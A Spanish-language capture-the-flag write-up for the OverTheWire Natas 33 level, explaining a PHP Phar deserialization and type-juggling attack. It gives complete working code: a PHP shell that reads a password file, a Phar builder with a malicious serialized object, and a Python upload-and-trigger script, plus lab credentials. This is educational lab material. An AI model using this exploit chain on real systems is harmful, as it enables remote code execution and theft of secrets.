# Natas 33 → 34 (FINAL)

## Información del nivel

| Campo | Valor |
|---|---|
| URL | http://natas33.natas.labs.overthewire.org |
| Usuario | natas33 |
| Contraseña | 2v9nDlbSF7jvawaCncr5Z9kSzkmBeoCJ |
| Contraseña obtenida | j4O7Q7Q5er5XFRCepmyXJaWCSIrslCJY |

---

## Reconocimiento

La página presenta un formulario para subir un "firmware update". El código fuente revela una clase `Executor` que solo ejecuta el archivo subido si su MD5 coincide con `adeafbadbabec0dedabada55ba55d00d`.

---

## Análisis del código fuente

```php
class Executor{
    private $filename = "";
    private $signature = 'adeafbadbabec0dedabada55ba55d00d';
    private $init = False;

    function __construct(){
        $this->filename = $_POST["filename"];
        if(filesize($_FILES['uploadedfile']['tmp_name']) > 4096) {
            echo "File is too big<br>";
        }
        else {
            move_uploaded_file($_FILES['uploadedfile']['tmp_name'], "/natas33/upload/" . $this->filename);
        }
    }

    function __destruct(){
        chdir("/natas33/upload/");
        if(md5_file($this->filename) == $this->signature){
            passthru("php " . $this->filename);
        }
        else{
            echo "Failur! MD5sum mismatch!<br>";
        }
    }
}
```

### El reto

- `$signature` es un hash MD5 fijo
- Para que `passthru()` se ejecute, `md5_file($filename)` debe coincidir con `$signature`
- No es factible generar un archivo con un MD5 específico (preimagen MD5 es computacionalmente impracticable)
- El reto: cambiar el `$signature` o el comportamiento de la comparación

---

## Vulnerabilidad: Phar Deserialization

### ¿Qué es Phar?

PHP Archive — formato que empaqueta scripts PHP. Tiene tres partes:
- **Stub** (código PHP de inicialización)
- **Metadata** (datos serializados arbitrarios)
- **Contenido** (los archivos)

### El comportamiento peligroso

Cuando PHP procesa una ruta `phar://archivo.phar/cualquier_cosa` con funciones del filesystem (`md5_file()`, `file_exists()`, `filesize()`, etc.), **deserializa automáticamente los metadatos del Phar** como efecto secundario — sin que el código llame explícitamente a `unserialize()`.

### El plan

1. Crear un Phar con metadata = un objeto `Executor` serializado donde `$signature = True` (en lugar del hash)
2. Subir el Phar
3. Llamar `md5_file()` con `phar://...` → deserializa → crea un nuevo `Executor` con `signature=True`
4. Al terminar el script, `__destruct()` del Executor inyectado se ejecuta
5. La comparación `md5_file($filename) == True` siempre es verdadera (cualquier hash != 0 es truthy)
6. `passthru("php $filename")` ejecuta nuestro shell

---

## ¿Qué es deserialización?

**Serializar** — convertir un objeto a string para guardarlo o transmitirlo:
```php
$str = serialize($obj);  // 'O:8:"Executor":2:{...}'
```

**Deserializar** — reconstruir el objeto a partir del string:
```php
$obj = unserialize($str);  // vuelve a ser un objeto
```

PHP ejecuta automáticamente métodos mágicos como `__construct()` y `__destruct()` al deserializar. Por eso es peligroso deserializar datos controlados por el atacante.

---

## Explotación

### Paso 1: Crear el shell PHP

```bash
nano marco_shell.php
```

```php
<?php
echo shell_exec('cat /etc/natas_webpass/natas34');
?>
```

### Paso 2: Crear el archivo Phar con el objeto malicioso

```bash
nano create_phar.php
```

```php
<?php
class Executor{
    private $filename = "marco_shell.php";
    private $signature = True;
    private $init = False;
}

@unlink("exploit.phar");
$phar = new Phar("exploit.phar");
$phar->startBuffering();
$phar->addFromString("test.txt", "test");
$phar->setStub("<?php __HALT_COMPILER(); ?>");
$phar->setMetadata(new Executor());
$phar->stopBuffering();
?>
```

```bash
php -d phar.readonly=0 create_phar.php
```

El flag `-d phar.readonly=0` desactiva la protección de PHP que impide crear archivos Phar por defecto.

### Paso 3: Script Python para subir y disparar

```bash
nano exploit33.py
```

```python
import requests
from requests.auth import HTTPBasicAuth

url = 'http://natas33.natas.labs.overthewire.org/index.php'
auth = HTTPBasicAuth('natas33', '2v9nDlbSF7jvawaCncr5Z9kSzkmBeoCJ')

# Subir el shell PHP
with open('marco_shell.php', 'rb') as f:
    requests.post(url, auth=auth,
        data={'filename': 'marco_shell.php'},
        files={'uploadedfile': ('marco_shell.php', f, 'application/x-php')})

# Subir el Phar
with open('exploit.phar', 'rb') as f:
    requests.post(url, auth=auth,
        data={'filename': 'exploit.phar'},
        files={'uploadedfile': ('exploit.phar', f, 'application/octet-stream')})

# Disparar el exploit con phar://
with open('exploit.phar', 'rb') as f:
    r = requests.post(url, auth=auth,
        data={'filename': 'phar:///natas33/upload/exploit.phar/test.txt'},
        files={'uploadedfile': ('dummy', f, 'application/octet-stream')})
print(r.text)
```

```bash
python3 exploit33.py
```

---

## El flujo completo

```
1. move_uploaded_file() falla (no puede crear ruta con phar://)
   ↓
2. __construct() del Executor original termina con error
   ↓
3. md5_file("phar:///natas33/upload/exploit.phar/test.txt") se llama
   ↓
4. PHP deserializa los metadatos del Phar → crea segundo Executor
   ↓ (nuevo Executor con filename=marco_shell.php, signature=True)
5. Script termina
   ↓
6. __destruct() del segundo Executor se ejecuta
   ↓
7. md5_file("marco_shell.php") devuelve algún hash → comparado con True
   ↓
8. Hash != 0 → True == True → verdadero
   ↓
9. passthru("php marco_shell.php") → ejecuta el shell
   ↓
10. shell_exec("cat /etc/natas_webpass/natas34") → contraseña
```

---

## Conceptos clave

- **Phar Deserialization**: técnica de explotación PHP donde se inyecta código via metadatos de archivos Phar. Funciones del filesystem como `md5_file()`, `file_exists()`, `filesize()` deserializan los metadatos automáticamente al procesar rutas `phar://`.
- **Métodos mágicos**: `__construct()` y `__destruct()` se ejecutan automáticamente al crear/destruir objetos. Vector clave para Object Injection.
- **Type juggling de PHP**: `==` con tipos diferentes hace conversión automática. `"hash" == True` es verdadero porque cualquier string no vacío se convierte a `true`.
- **Protocol wrappers PHP**: `phar://`, `php://`, `file://`, `data://` son wrappers que extienden las funciones del filesystem. Algunos tienen comportamientos peligrosos.
- **Defensa**: nunca pasar input del usuario a funciones del filesystem sin validar el wrapper. Usar `realpath()` o validar la ruta contra una whitelist.
